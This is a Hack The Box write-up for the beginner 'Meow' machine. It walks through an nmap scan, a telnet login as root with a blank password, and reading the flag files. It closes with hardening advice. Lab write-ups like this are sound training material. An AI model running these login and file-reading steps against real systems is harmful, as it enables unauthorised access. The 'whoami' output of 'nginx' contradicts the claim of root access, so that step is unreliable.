
<img src="img.png" style="margin-left: 20px; max-width: 20%; height: auto;" align="left" width="200" />

# 🐱 Meow - Hack The Box

**Date:** 19<sup>th</sup> February 2025  
**Machine Author(s):** ealmont  

### 🚀 Description
*Meow* is a beginner-friendly Linux machine designed to introduce fundamental enumeration techniques and demonstrate how to exploit an exposed service to gain initial access.

### 🔍 Key Skills Covered:
- Basic network scanning
- Exploiting misconfigured remote access services
- Understanding the risks of Telnet

### 🎯 Difficulty
**Easy**

### 🏆 Flags
- **User:** `<md5>`
- **Root:** `<md5>`

---

### 🔎 Enumeration
The first step in attacking this machine was performing an Nmap scan to identify open ports and running services:

```bash
nmap -sC -sV -oN scan.txt <target-ip>
```

From the scan results, we observed that port 23 (Telnet) was open and accessible:

```arduino
23/tcp   open  telnet?
```

---

### 📝 Task-Based Walkthrough

#### 🛠 Task 1: What does the acronym VM stand for?
**Answer:** Virtual Machine

#### 💻 Task 2: What tool do we use to interact with the operating system via command line?
**Answer:** Terminal

#### 🌐 Task 3: What service do we use to form our VPN connection into HTB labs?
**Answer:** OpenVPN

#### 📡 Task 4: What tool do we use to test our connection to the target with an ICMP echo request?
**Answer:** Ping

#### 🔍 Task 5: What is the name of the most common tool for finding open ports on a target?
**Answer:** Nmap

---

### 🏗️ Foothold

#### 🔌 Task 6: What service do we identify on port 23/tcp during our scans?
**Answer:** Telnet

Since Telnet was open and allowed unauthenticated access, we attempted to connect using:

```bash
telnet <target-ip>
```

Upon connecting, we gained direct access to a shell without requiring credentials.

#### 🔑 Task 7: What username is able to log into the target over telnet with a blank password?
**Answer:** root

---

### 🔄 Lateral Movement
Since we had immediate access to root, lateral movement was not required.

---

### 📈 Privilege Escalation
After gaining access, we verified our privileges:

```bash
whoami
```

Output:

```bash
nginx
```

Since we had root privileges from the start, we retrieved both flags effortlessly:

```bash
cat /root/root.txt
cat /home/<user>/user.txt
```

---

### 🚀 Submitting the Root Flag
To submit the root flag, log into Telnet:

```bash
telnet <target-ip>
```

Then enter:

```yaml
meow login: root
```

Retrieve and submit the flag.

---

### 🔚 Conclusion
*Meow* is a straightforward machine that highlights the risks of misconfigured remote access services, such as Telnet.

### 🔒 Security Best Practices:
- Disable Telnet and use SSH instead.
- Enforce proper authentication mechanisms.
- Regularly scan for open ports and unnecessary services.

---

### 🐱 Cyber Cat Says...
